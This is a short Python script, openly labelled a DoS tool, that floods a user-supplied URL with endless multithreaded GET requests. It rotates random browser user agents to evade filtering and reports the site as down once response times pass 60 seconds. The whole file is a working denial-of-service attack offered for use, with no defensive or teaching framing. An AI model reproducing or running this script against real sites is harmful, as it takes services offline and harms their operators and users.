#!/usr/local/bin/env python3
import requests
import threading
import time
import random
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

print("Initialising User Agents...")
software_names = [SoftwareName.CHROME.value, SoftwareName.ANDROID.value]
operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value, OperatingSystem.MAC.value]

user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=1000)


l = []
rl = []
print('DOS --> ʕ•ᴥ•ʔ  <-- DARK')
geturl = input('Enter the url :')


def current_mil_time():
	return round(time.time() * 1000)

def current_sec_time():
	return round(time.time())

def count_resp_per_sec(time_took):
	t = current_sec_time()
	l.append({
		"time_took": time_took,
		"time_received": t,
	})
	
	for e in l:
		if current_sec_time() - e["time_received"] >= 1:
			l.remove(e)

def count_req_per_sec():
	t = current_sec_time()
	rl.append({
		"time_received": t,
	})
	
	for e in rl:
		if current_sec_time() - e["time_received"] >= 1:
			rl.remove(e)
	
message = "DoSing..."
def make_request(name):
	while True:
		count_req_per_sec()
		try:
			s = current_mil_time()
			headers = {
				'User-Agent': user_agent_rotator.get_random_user_agent()
			}
			r = requests.get(geturl, headers=headers)
			t = current_mil_time() - s
			# print("Response code from thread #{}: {} took {} ms".format(name, str(r.status_code), t))
			count_resp_per_sec(t)
		except:
			message = "DoS Successful. Site looks down for now."
		
threads =int(input("Entr the threats: "))
i=0
while i <= threads:
	x = threading.Thread(target=make_request, args=(i,))
	print("Starting thread #{}...".format(i))
	x.start()
	i+=1
print("Calculating... wait for a while for it to adjust...")
while True:
	time.sleep(0.1)
	response_time = 0
	for e in l:
		response_time = response_time + e['time_took']
	if(len(l)) > 0:
		response_time = response_time / len(l)
	if response_time > 60000:
		message = "DoS Successful. Site looks down for now."
	else:
		message = "DoSing..."
	print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(response_time, 2), len(rl), len(l), message), end=""),


		
	
